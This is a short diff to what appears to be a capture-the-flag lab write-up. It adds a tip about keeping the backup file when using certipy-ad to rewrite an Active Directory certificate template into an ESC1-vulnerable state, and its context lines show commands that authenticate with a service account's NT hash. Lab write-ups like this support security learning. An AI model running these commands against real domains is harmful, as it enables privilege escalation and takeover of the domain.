@@ -413,6 +413,8 @@ certipy-ad find -u ca_svc@sequel.htb -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -s
 
 2. Comprimise the certificate template, which allows us to perform an ESC1 Attack after.
 
+(After you run -write-default-configuration save that json file it creates (which is the backup configuration) to another directory. If you run the command a 2nd time, after it made changes to become vulnerable to ESC1, it will overwrite that file and then you cannot restore the config.)
+
 ```
 certipy-ad template -u ca_svc@sequel.htb -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -template DunderMifflinAuthentication -write-default-configuration
 ```
